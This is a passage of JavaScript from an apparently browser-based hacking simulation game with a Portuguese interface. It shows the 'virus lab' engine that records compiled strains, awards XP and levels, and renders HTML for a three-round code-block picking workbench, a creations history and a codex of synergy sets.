        id: 'strain_' + Date.now() + '_' + Math.floor(Math.random() * 999),
        createdAt: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
        strainName,
        family: evalRes.dominantFamily,
        filename: evalRes.familyMeta.filename,
        versionInt: evalRes.versionInt,
        versionLabel: evalRes.versionLabel,
        fitScore: evalRes.fitScore,
        fitGrade: evalRes.fitGrade,
        setId: evalRes.matchedSet ? evalRes.matchedSet.id : null,
        setName: evalRes.matchedSet ? evalRes.matchedSet.name : 'Protótipo Sem Conjunto',
        blockIds: [draft.picks.r1, draft.picks.r2[0], draft.picks.r2[1], draft.picks.r3]
      };
      this.state.creations.unshift(creationRecord);
      if (this.state.creations.length > 30) this.state.creations.length = 30;

      this.state.activeDraft = null;
      this.lastCompileReport = {
        ...evalRes,
        strainName,
        gainedXp,
        discoveryBonusXp,
        isNewSetDiscovery,
        prevLevel,
        newLevel: this.state.level,
        leveledUp,
        repGain,
        diskDelivery
      };

      this.save();
      if (window.onlineEngine) window.onlineEngine.scheduleSave(false);
      if (typeof window.updateHudDisplays === 'function') window.updateHudDisplays();
      if (typeof window.addLocalLog === 'function') {
        window.addLocalLog(
          'VIRUS-LAB',
          `Cepa "${strainName}" (${evalRes.familyMeta.filename} ${evalRes.versionLabel}) compilada — Encaixe ${evalRes.fitScore}% (Nota ${evalRes.fitGrade}) · +${gainedXp} XP Lab`,
          evalRes.fitScore >= 62 ? 'success' : 'warn'
        );
      }
      if (window.hackerAudio) {
        if (evalRes.fitScore >= 62 && typeof window.hackerAudio.playCashChime === 'function') {
          window.hackerAudio.playCashChime();
        }
      }
      if (typeof window.showToast === 'function') {
        window.showToast(
          leveledUp
            ? `🎉 Laboratório subiu p/ Nível ${this.state.level}! Vírus ${evalRes.versionLabel} (${evalRes.fitGrade}) salvo em Programas!`
            : `🧬 Vírus ${strainName} (${evalRes.versionLabel} · Nota ${evalRes.fitGrade}) salvo no seu PC!`
        );
      }

      this.renderUI();
      return { success: true, report: this.lastCompileReport };
    }

    switchTab(tabKey) {
      this.activeTab = ['workbench', 'creations', 'codex'].includes(tabKey) ? tabKey : 'workbench';
      this.renderUI();
    }

    // =========================================================================
    // RENDERIZAÇÃO DA INTERFACE (.soft-frame + 3 Abas + Bancada de 3 Rounds)
    // =========================================================================
    renderUI(mountId = 'virusLabAppBody') {
      this.ensureLoaded();
      const mount = typeof document !== 'undefined' ? document.getElementById(mountId) : null;
      if (!mount) return;

      const lvl = this.getLevelMeta();
      const stats = this.getCombinatoricsStats();
      const discCount = this.state.discoveredSets.length;

      let mainHtml = '';
      if (this.activeTab === 'workbench') {
        mainHtml = this.renderWorkbenchHtml(lvl, stats);
      } else if (this.activeTab === 'creations') {
        mainHtml = this.renderCreationsHtml();
      } else {
        mainHtml = this.renderCodexHtml(lvl);
      }

      const sideHtml = this.renderSidebarHtml(lvl, stats, discCount);

      mount.innerHTML = `
        <div class="soft-frame">
          <div class="vlab-top-tabs" role="tablist" aria-label="Abas do Laboratório de Vírus">
            <button type="button" role="tab" id="vlabTabWorkbench" class="vlab-tab-btn"
              aria-selected="${this.activeTab === 'workbench' ? 'true' : 'false'}"
              onclick="window.virusLabEngine.switchTab('workbench')">
              ${window.HC ? HC.icon('code-2') : ''}
              <span>Bancada de Código (3 Rounds)</span>
            </button>
            <button type="button" role="tab" id="vlabTabCreations" class="vlab-tab-btn"
              aria-selected="${this.activeTab === 'creations' ? 'true' : 'false'}"
              onclick="window.virusLabEngine.switchTab('creations')">
              ${window.HC ? HC.icon('bug') : ''}
              <span>Minhas Criações (${this.state.creations.length})</span>
            </button>
            <button type="button" role="tab" id="vlabTabCodex" class="vlab-tab-btn"
              aria-selected="${this.activeTab === 'codex' ? 'true' : 'false'}"
              onclick="window.virusLabEngine.switchTab('codex')">
              ${window.HC ? HC.icon('book-open') : ''}
              <span>Códice de Conjuntos (${discCount}/${stats.totalSynergySets})</span>
            </button>
          </div>

          <div class="vlab-layout">
            <div role="tabpanel" aria-labelledby="${this.activeTab === 'workbench' ? 'vlabTabWorkbench' : (this.activeTab === 'creations' ? 'vlabTabCreations' : 'vlabTabCodex')}">
              ${mainHtml}
            </div>
            <aside class="vlab-side-stack" aria-label="Progresso e Pipeline do Laboratório">
              ${sideHtml}
            </aside>
          </div>
        </div>
      `;
    }

    renderWorkbenchHtml(lvl) {
      if (this.lastCompileReport && !this.state.activeDraft) {
        return this.renderCompileReportHtml(this.lastCompileReport);
      }

      const draft = this.state.activeDraft || this.startNewDraft(true);
      const r = draft.round;
      const cardIds = draft.optionsByRound[r] || [];

      const roundMeta = {
        1: {
          title: 'Round 1 de 3 — Vetor de Abertura',
          sub: 'Analise os 3 trechos de código abaixo e escolha APENAS 1 bloco inicial. Não há rótulos prontos: leia os tipos de socket, registradores ou memória que o bloco abre!',
          req: 1,
          curCount: draft.picks.r1 ? 1 : 0
        },
        2: {
          title: 'Round 2 de 3 — Dupla de Núcleos de Processamento',
          sub: 'Agora apareceram mais 3 blocos! Escolha EXATAMENTE 2 blocos que trabalhem bem juntos e conversem com o que você abriu no Round 1.',
          req: 2,
          curCount: (draft.picks.r2 || []).length
        },
        3: {
          title: 'Round 3 de 3 — Rotina de Fechamento & Camuflagem',
          sub: 'Última rodada! Escolha APENAS 1 bloco final para selar os descritores, esconder rastros e compilar o vírus completo.',
          req: 1,
          curCount: draft.picks.r3 ? 1 : 0
        }
      }[r];

      const cardsHtml = cardIds.map((id, idx) => {
        const b = BLOCK_BY_ID.get(id);
        if (!b) return '';
        const isSelected = r === 1
          ? draft.picks.r1 === id
          : (r === 2 ? (draft.picks.r2 || []).includes(id) : draft.picks.r3 === id);
        const selOrder = r === 2 && isSelected ? ` #${draft.picks.r2.indexOf(id) + 1}` : '';

        return `
          <button type="button" class="vlab-block-card" id="vlabCard_${esc(b.id)}"
            data-block-id="${esc(b.id)}"
            aria-pressed="${isSelected ? 'true' : 'false'}"
            onclick="window.virusLabEngine.toggleSelectBlock('${esc(b.id)}')">
            <div>
              <div class="vlab-block-head">
                <span class="vlab-block-lang">${esc(b.lang)}</span>
                <span class="vlab-tier-chip t-${b.tier}">Camada ${['I', 'II', 'III', 'IV', 'V'][b.tier - 1] || 'I'}</span>
              </div>
              <div class="vlab-block-fn">${esc(b.fn)}</div>
              <pre class="vlab-code-pre"><code>${esc(b.code)}</code></pre>
            </div>
            <div class="vlab-block-foot">
              <span class="vlab-abi-sig">${esc(b.abi)}</span>
              <span class="vlab-select-indicator">${isSelected ? `✓ SELECIONADO${selOrder}` : `[Opção ${idx + 1}]`}</span>
            </div>
          </button>
        `;
      }).join('');

      const canProceed = roundMeta.curCount === roundMeta.req;

      let actionRightHtml = '';
      if (r < 3) {
        actionRightHtml = `
          <button type="button" id="btnVlabNextRound" class="hc-btn primary" ${canProceed ? '' : 'disabled'}
            onclick="window.virusLabEngine.advanceRound()">
            Confirmar ${r === 1 ? '1 Bloco' : '2 Blocos'} (${roundMeta.curCount}/${roundMeta.req}) → Ir p/ Round ${r + 1}
          </button>
        `;
      } else {
        actionRightHtml = `
          <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
            <input type="text" id="vlabStrainNameInput" class="form-input"
              style="width:185px;font-family:var(--hc-font-mono);font-size:0.8rem;"
              maxlength="26" value="${esc(draft.customName || 'Hydra-X1')}"
              aria-label="Nome da cepa do vírus" placeholder="Nome da cepa">
            <button type="button" id="btnVlabCompile" class="hc-btn primary" ${canProceed ? '' : 'disabled'}
              onclick="window.virusLabEngine.compileCurrentDraft()">
              ⚡ Juntar os 4 Blocos &amp; Compilar Vírus
            </button>
          </div>
        `;
      }

      return `
        <div class="vlab-stepper" aria-label="Etapas de desenvolvimento do vírus">
          <div class="vlab-step-pill ${r === 1 ? 'is-active' : 'is-done'}">
            <span class="vlab-step-kicker">Round 1</span>
            <span class="vlab-step-title">Vetor Inicial</span>
            <span class="vlab-step-rule">3 opções → Escolher 1</span>
          </div>
          <div class="vlab-step-pill ${r === 2 ? 'is-active' : (r > 2 ? 'is-done' : '')}">
            <span class="vlab-step-kicker">Round 2</span>
            <span class="vlab-step-title">Núcleo Duplo</span>
            <span class="vlab-step-rule">3 opções → Escolher 2</span>
          </div>
          <div class="vlab-step-pill ${r === 3 ? 'is-active' : ''}">
            <span class="vlab-step-kicker">Round 3</span>
            <span class="vlab-step-title">Fechamento</span>
            <span class="vlab-step-rule">3 opções → Escolher 1</span>
          </div>
          <div class="vlab-step-pill">
            <span class="vlab-step-kicker">Compilador</span>
            <span class="vlab-step-title">Teste de Encaixe</span>
            <span class="vlab-step-rule">Teto atual: v${(lvl.maxVerInt / 10).toFixed(1)}</span>
          </div>
        </div>

        <div class="vlab-round-banner">
          <div>
            <div class="hc-eyebrow">Desenvolvimento Experimental · Sorteio Aleatório de Blocos</div>
            <h3 class="vlab-round-title">${esc(roundMeta.title)}</h3>
            <p class="vlab-round-sub">${esc(roundMeta.sub)}</p>
          </div>
          <div class="vlab-pick-counter" id="vlabPickCounter">
            Escolhidos: ${roundMeta.curCount} / ${roundMeta.req}
          </div>
        </div>

        <div class="vlab-cards-grid">
          ${cardsHtml}
        </div>

        <div class="vlab-actions-bar">
          <button type="button" class="hc-btn ghost sm" onclick="window.virusLabEngine.startNewDraft()">
            🔄 Descartar Rascunho &amp; Sortear Novos Blocos
          </button>
          ${actionRightHtml}
        </div>
      `;
    }

    renderCompileReportHtml(rep) {
      const gradeCls = rep.fitGrade === 'S+' ? 'vlab-grade-Splus' : `vlab-grade-${rep.fitGrade}`;
      const diagItems = rep.diagnostics.map((d) => `<li class="${esc(d.kind)}">${esc(d.text)}</li>`).join('');
      const setBanner = rep.matchedSet
        ? `<div style="padding:11px 14px;border-radius:9px;background:rgba(53,184,119,0.1);border:1px solid rgba(53,184,119,0.45);margin-bottom:12px;">
             <div style="display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap;">
               <strong style="color:#4ade80;font-size:0.88rem;">
                 ${rep.isNewSetDiscovery ? '✨ NOVO CONJUNTO DESCOBERTO!' : '🧬 Conjunto Sintetizado:'} #${String(rep.matchedSet.num).padStart(2, '0')} — ${esc(rep.matchedSet.name)}
               </strong>
               <span class="hc-badge success">Multiplicador ${rep.matchedSet.bonusMult.toFixed(2)}x</span>
             </div>
             <div style="font-size:0.78rem;color:var(--hc-text-2);margin-top:4px;">${esc(rep.matchedSet.desc)}</div>
           </div>`
        : `<div style="padding:10px 13px;border-radius:9px;background:rgba(248,113,113,0.09);border:1px solid rgba(248,113,113,0.35);margin-bottom:12px;font-size:0.8rem;color:#fecaca;">
             ⚠️ Os 4 blocos tiveram atrito estrutural (Encaixe ${rep.fitScore}%), gerando um protótipo fraco sem ativar conjunto secreto — mas você ganhou <strong>+${rep.gainedXp} XP</strong> para liberar camadas melhores!
           </div>`;

      return `
        <div class="vlab-result-card" id="vlabCompileResultCard">
          <div style="display:flex;justify-content:space-between;align-items:flex-start;gap:14px;flex-wrap:wrap;margin-bottom:14px;">
            <div style="display:flex;align-items:center;gap:14px;">
              <div class="vlab-grade-badge ${gradeCls}" title="Nota de Encaixe dos 4 Blocos">${esc(rep.fitGrade)}</div>
              <div>
                <div class="hc-eyebrow">Compilação Concluída · Sinergia de Código ${rep.fitScore}%</div>
                <div style="font-size:1.18rem;font-weight:800;color:var(--hc-text);">
                  ${esc(rep.strainName)} <span style="font-family:var(--hc-font-mono);color:var(--hc-accent-text);">${esc(rep.versionLabel)}</span>
                </div>
                <div style="font-size:0.8rem;color:var(--hc-text-2);">
                  Família gerada: <strong>${esc(rep.familyMeta.label)}</strong> — ${esc(rep.familyMeta.yieldDesc)}
                </div>
              </div>
            </div>
            <div style="text-align:right;font-family:var(--hc-font-mono);font-size:0.78rem;">
              <div style="color:#4ade80;font-weight:700;">+${rep.gainedXp} XP de Laboratório</div>
              <div style="color:#38bdf8;">+${rep.repGain} Reputação</div>
              ${rep.leveledUp ? `<div class="hc-badge success" style="margin-top:4px;">SUBIU P/ NÍVEL ${rep.newLevel}!</div>` : ''}
            </div>
          </div>

          ${setBanner}

          <div class="hc-eyebrow" style="margin-bottom:6px;">Diagnóstico do Linker (Por que ficou mais forte ou mais fraco)</div>
          <ul class="vlab-diag-list">
            ${diagItems}
          </ul>

          <details style="margin:12px 0;">
            <summary style="cursor:pointer;font-family:var(--hc-font-mono);font-size:0.77rem;color:var(--hc-text-2);">
              Ver código-fonte fundido dos 4 blocos (${rep.blocks.map((b) => b.id).join(' + ')})
            </summary>
            <pre class="vlab-code-pre" style="margin-top:8px;max-height:220px;"><code>${esc(rep.fusedCode)}</code></pre>
          </details>

          <div style="display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap;margin-top:14px;padding-top:12px;border-top:1px solid var(--hc-border);">
            <button type="button" class="hc-btn ghost" onclick="window.navTo('winSoftware')">
              📦 Ver em Programas &amp; Proteção (${esc(rep.familyMeta.filename)})
            </button>
            <button type="button" id="btnVlabDevelopAnother" class="hc-btn primary" onclick="window.virusLabEngine.startNewDraft()">
              🧬 Desenvolver Novo Vírus (Sortear 3 Opções)
            </button>
          </div>
        </div>
      `;
    }

    renderCreationsHtml() {
      if (this.state.creations.length === 0) {
        return `
          <div class="hc-card" style="padding:24px;text-align:center;">
            <div style="font-size:0.95rem;font-weight:700;margin-bottom:6px;">Nenhum vírus desenvolvido ainda</div>
            <p style="font-size:0.82rem;color:var(--hc-text-2);margin-bottom:14px;">
              Vá até a <strong>Bancada de Código (3 Rounds)</strong> e junte 4 blocos de programação (1 + 2 + 1) para compilar sua primeira cepa autoral!
            </p>
            <button type="button" class="hc-btn primary" onclick="window.virusLabEngine.switchTab('workbench')">Ir para a Bancada</button>
          </div>
        `;
      }

      const rows = this.state.creations.map((c) => `
        <tr>
          <td style="font-family:var(--hc-font-mono);font-weight:700;color:var(--hc-text);">${esc(c.strainName)}</td>
          <td style="font-family:var(--hc-font-mono);color:var(--hc-text-2);">${esc(c.filename)}</td>
          <td style="font-family:var(--hc-font-mono);color:var(--hc-accent-text);font-weight:700;">${esc(c.versionLabel)}</td>
          <td><span class="hc-badge ${c.fitScore >= 74 ? 'success' : (c.fitScore >= 50 ? 'warn' : 'danger')}">${esc(c.fitGrade)} (${c.fitScore}%)</span></td>
          <td style="font-size:0.78rem;color:var(--hc-text-2);">${esc(c.setName)}</td>
          <td style="font-family:var(--hc-font-mono);font-size:0.72rem;color:var(--hc-text-3);">${esc((c.blockIds || []).join(' · '))}</td>
        </tr>
      `).join('');

      return `
        <div class="hc-card" style="padding:14px;overflow-x:auto;">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;gap:8px;flex-wrap:wrap;">
            <div>
              <div class="hc-eyebrow">Arquivo de Cepas Compiladas</div>
              <div style="font-size:0.92rem;font-weight:700;">Histórico de Vírus Desenvolvidos no Seu Laboratório</div>
            </div>
            <button type="button" class="hc-btn sm primary" onclick="window.virusLabEngine.startNewDraft()">+ Novo Experimento</button>
          </div>
          <table class="soft-table" style="width:100%;">
            <thead>
              <tr>
                <th>Cepa</th>
                <th>Binário</th>
                <th>Potência</th>
                <th>Encaixe</th>
                <th>Conjunto Ativado</th>
                <th>Assinatura (1+2+1)</th>
              </tr>
            </thead>
            <tbody>${rows}</tbody>
          </table>
        </div>
      `;
    }

    renderCodexHtml(lvl) {
      const cards = VIRUS_SYNERGY_SETS.map((s) => {
        const unlocked = this.state.discoveredSets.includes(s.id);
        const tierLocked = s.minTier > lvl.maxTier;
        const famMeta = VIRUS_FAMILY_META[s.family];
        return `
          <div class="vlab-codex-card ${unlocked ? 'unlocked' : 'locked'}">
            <div style="display:flex;justify-content:space-between;align-items:center;gap:6px;">
              <span style="font-family:var(--hc-font-mono);font-size:0.72rem;color:${unlocked ? '#4ade80' : 'var(--hc-text-3)'};">
                #${String(s.num).padStart(2, '0')} · Camada ${['I', 'II', 'III', 'IV', 'V'][s.minTier - 1]}
              </span>
              <span class="hc-badge ${unlocked ? 'success' : ''}" style="font-size:0.68rem;">
                ${unlocked ? `${s.bonusMult.toFixed(2)}x` : (tierLocked ? 'Bloqueado (Nv.+)' : 'Não Descoberto')}
              </span>
            </div>
            <div style="font-size:0.84rem;font-weight:700;color:var(--hc-text);">
              ${unlocked ? esc(s.name) : '??? Conjunto Criptografado'}
            </div>
            <div style="font-size:0.74rem;color:var(--hc-text-2);">
              ${unlocked
                ? `${esc(s.desc)} <br><span style="color:#38bdf8;font-family:var(--hc-font-mono);">${esc(famMeta.filename)}</span>`
                : `Desenvolva vírus na Camada ${['I', 'II', 'III', 'IV', 'V'][s.minTier - 1]}+ combinando blocos compatíveis para revelar.`}
            </div>
          </div>
        `;
      }).join('');

      return `
        <div>
          <div style="margin-bottom:12px;">
            <div class="hc-eyebrow">Catálogo de Engenharia · 54 Arquétipos</div>
            <div style="font-size:0.95rem;font-weight:700;">Códice de Conjuntos de Vírus (${this.state.discoveredSets.length} de ${VIRUS_SYNERGY_SETS.length} Descobertos)</div>
            <p style="font-size:0.79rem;color:var(--hc-text-2);margin:3px 0 0;">
              Suba o nível do laboratório desenvolvendo mais vírus para destravar as Camadas II a V e descobrir os 54 conjuntos possíveis!
            </p>
          </div>
          <div class="vlab-codex-grid">
            ${cards}
          </div>
        </div>
      `;
    }

    renderSidebarHtml(lvl, stats, discCount) {
      const draft = this.state.activeDraft;
      const b1 = draft && draft.picks.r1 ? BLOCK_BY_ID.get(draft.picks.r1) : null;
      const b2a = draft && draft.picks.r2 && draft.picks.r2[0] ? BLOCK_BY_ID.get(draft.picks.r2[0]) : null;
      const b2b = draft && draft.picks.r2 && draft.picks.r2[1] ? BLOCK_BY_ID.get(draft.picks.r2[1]) : null;
      const b3 = draft && draft.picks.r3 ? BLOCK_BY_ID.get(draft.picks.r3) : null;

      return `
        <div class="vlab-side-box">
          <div style="display:flex;justify-content:space-between;align-items:center;">
            <span class="hc-eyebrow">Nível do Laboratório</span>
            <span class="hc-badge ${lvl.isMaxLevel ? 'success' : 'info'}" id="vlabLevelBadge">
              Nv. ${lvl.level} / ${MAX_LAB_LEVEL}${lvl.isMaxLevel ? ' (MÁX)' : ''}
            </span>
          </div>
          <div style="font-size:0.94rem;font-weight:700;margin-top:4px;">${esc(lvl.title)}</div>
          <div class="vlab-xp-track" aria-label="Progresso de XP do Laboratório">
            <div class="vlab-xp-fill" style="width:${lvl.progressPct}%;"></div>
          </div>
          <div style="display:flex;justify-content:space-between;font-family:var(--hc-font-mono);font-size:0.72rem;color:var(--hc-text-2);">
            <span>${lvl.xp} XP</span>
            <span>${lvl.isMaxLevel ? 'NÍVEL MÁXIMO' : `Próx: ${lvl.nextXpReq} XP`}</span>
          </div>
          <div style="margin-top:8px;padding-top:8px;border-top:1px solid var(--hc-border);font-size:0.75rem;color:var(--hc-text-2);">
            <div>Camada ativa: <strong style="color:#4ade80;">Camada I até ${['I', 'II', 'III', 'IV', 'V'][lvl.maxTier - 1]}</strong></div>
            <div>Teto atual de compilação: <strong style="font-family:var(--hc-font-mono);color:#38bdf8;">v${(lvl.maxVerInt / 10).toFixed(1)}</strong></div>
            <div style="margin-top:4px;color:var(--hc-text-3);">${esc(lvl.nextUnlockNote)}</div>
          </div>
        </div>

        <div class="vlab-side-box">
          <div class="hc-eyebrow">Slots da Montagem Atual (1 + 2 + 1)</div>
          <div class="vlab-slot-list">
            <div class="vlab-slot-row ${b1 ? 'filled' : ''}">
              <span>R1 [1/1]</span>
              <span>${b1 ? esc(b1.id + ' · ' + b1.lang) : 'Aguardando...'}</span>
            </div>
            <div class="vlab-slot-row ${b2a ? 'filled' : ''}">
              <span>R2-A [1/2]</span>
              <span>${b2a ? esc(b2a.id + ' · ' + b2a.lang) : 'Aguardando...'}</span>
            </div>
            <div class="vlab-slot-row ${b2b ? 'filled' : ''}">
              <span>R2-B [2/2]</span>
              <span>${b2b ? esc(b2b.id + ' · ' + b2b.lang) : 'Aguardando...'}</span>
            </div>
            <div class="vlab-slot-row ${b3 ? 'filled' : ''}">
              <span>R3 [1/1]</span>
              <span>${b3 ? esc(b3.id + ' · ' + b3.lang) : 'Aguardando...'}</span>
            </div>
          </div>
        </div>

        <div class="vlab-side-box">
          <div class="hc-eyebrow">Matriz Combinatória</div>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:8px;font-family:var(--hc-font-mono);font-size:0.76rem;">
            <div style="padding:7px;border-radius:6px;background:#0a0e13;border:1px solid #1e2733;">
              <div style="color:var(--hc-text-3);font-size:0.66rem;">BLOCOS REAIS</div>
              <strong style="color:var(--hc-text);font-size:0.92rem;">${stats.totalBlocks}</strong>
            </div>
            <div style="padding:7px;border-radius:6px;background:#0a0e13;border:1px solid #1e2733;">
              <div style="color:var(--hc-text-3);font-size:0.66rem;">JUNÇÕES ÚNICAS</div>
              <strong style="color:#38bdf8;font-size:0.92rem;">${stats.totalCombinations.toLocaleString('pt-BR')}</strong>
            </div>
            <div style="padding:7px;border-radius:6px;background:#0a0e13;border:1px solid #1e2733;">
              <div style="color:var(--hc-text-3);font-size:0.66rem;">CONJUNTOS</div>
              <strong style="color:#4ade80;font-size:0.92rem;">${discCount} / ${stats.totalSynergySets}</strong>
            </div>
            <div style="padding:7px;border-radius:6px;background:#0a0e13;border:1px solid #1e2733;">
              <div style="color:var(--hc-text-3);font-size:0.66rem;">COMPILADOS</div>
              <strong style="color:var(--hc-text);font-size:0.92rem;">${this.state.totalCompiled}</strong>
            </div>
          </div>
        </div>
      `;
    }
  }

  window.VIRUS_LAB_CONSTANTS = {
    MAX_LAB_LEVEL,
    LAB_LEVEL_TABLE,
    ROUND_1_BLOCKS,
    ROUND_2_BLOCKS,
    ROUND_3_BLOCKS,
    VIRUS_SYNERGY_SETS
  };
  window.virusLabEngine = new VirusLabEngine();
})();
